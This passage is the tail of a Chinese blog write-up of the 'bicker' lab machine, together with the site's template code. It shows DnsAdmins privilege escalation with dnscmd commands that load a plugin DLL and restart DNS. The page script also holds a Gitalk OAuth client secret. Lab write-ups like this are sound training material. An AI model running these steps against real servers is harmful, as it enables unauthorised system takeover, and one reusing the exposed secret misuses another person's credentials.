+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscmd.exe /config /serverlevelplugindll C:/wirtetemp/1.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119214637012.png" alt="image-20251119214637012"></p>
+<p>注册成功</p>
+<p>现在只需要重启dns服务即可提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscmd.exe /restart</span><br></pre></td></tr></table></figure>
+
+<p>成功提权</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119214754428.png" alt="image-20251119214754428"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/mazesec/" rel="tag" title="mazesec">mazesec</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/windows/" rel="tag" title="windows">windows</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/wp/" rel="tag" title="wp">wp</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag" title="域渗透">域渗透</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%89%93%E9%9D%B6/" rel="tag" title="打靶">打靶</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap left">
+        
+          
+          
+            <img data-src="/covers/50492988_p0.jpg" data-sizes="auto" alt="我在其他平台发的文章" class="lazyload">
+          
+        
+        <a href="/2025/12/15/%E6%88%91%E5%9C%A8%E5%85%B6%E4%BB%96%E5%B9%B3%E5%8F%B0%E5%8F%91%E7%9A%84%E6%96%87%E7%AB%A0/" aria-label="前一篇: 我在其他平台发的文章" title="前一篇: 我在其他平台发的文章"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            我在其他平台发的文章
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/CB383AC6ACEE4AED3D216ADAAB3BFBCB.jpg" data-sizes="auto" alt="ezAI1靶机" class="lazyload">
+        
+      
+      <a href="/2025/11/09/%E6%AF%8F%E6%97%A5%E9%9D%B6%E6%9C%BA%E3%81%AEezAI1%E9%9D%B6%E6%9C%BA/" aria-label="后一篇: ezAI1靶机"  title="后一篇: ezAI1靶机"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          ezAI1靶机
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="gitalk">
+              <span>gitalk</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment gitalk-comment" data-aos="fade-up"
+          id="gitalk-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2025
+      
+      <span class="footer-info-sep rotate"></span>
+      S@Ku_yA
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        14.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:05
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">bicker靶机复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.</span> <span class="toc-text">smb匿名访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9B%BE%E7%89%87%E5%85%83%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.</span> <span class="toc-text">查看图片元数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#winrm"><span class="toc-number">1.4.</span> <span class="toc-text">winrm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-number">1.6.</span> <span class="toc-text">提权思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E8%A7%A3%E5%AF%86"><span class="toc-number">1.7.</span> <span class="toc-text">凭证解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E9%92%A5"><span class="toc-number">1.8.</span> <span class="toc-text">破解密钥</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">23</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">12</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "S@Ku_yA",
+          title: "bicker靶机",
+          url: "http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "bicker靶机复现端口信息1nmap -T4 -A -v 192.168.20.130    发现大量开放端口 smb匿名访问尝试匿名访问smb 123smbclient -L //192.168.20.130  -N-L #表示列出对应服务器的目录-N #表示不用密码登录 匿名登录   可以匿名访问 发现有几个奇怪的东西puppy 我们下载下来看看   查看图片元数据一张奇怪的图片 我们使用exiftool工具查看图片的元数据  发现bilibili和uid 猜测是一个b站用户  确实有一个",
+          date: "Tue Nov 18 2025 19:45:36 GMT+0800",
+          updated: "Mon Dec 15 2025 15:34:33 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["gitalk"];
+  var commentConfig = {
+    
+    
+    
+    
+    gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.min.js',
+          'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU/lcEH5O8eVbSDhbPwsiVUTp/aGX/z/5EuMA'
+        );
+
+        script.onload = () => {
+          if (false) {
+            const md5Script = loadScript(
+              'https://npm.webcache.cn/blueimp-md5@2.19.0/js/md5.min.js',
+              'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr/gZlbkHkL6vTthxH'
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            initGitalk();
+          }
+        }
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          var gitalkId = location.pathname;
+          var gitalk = new Gitalk({
+            clientID: 'Ov23li1mTMN9Ccjmkh5p',
+            clientSecret: 'ea6c17281ea880a0862ad92a2aec900906d054f0',
+            repo: 'my_blog',
+            owner: 'sakuya-sys',
+            admin: ["sakuya-sys"],
+            id: gitalkId,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          })
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
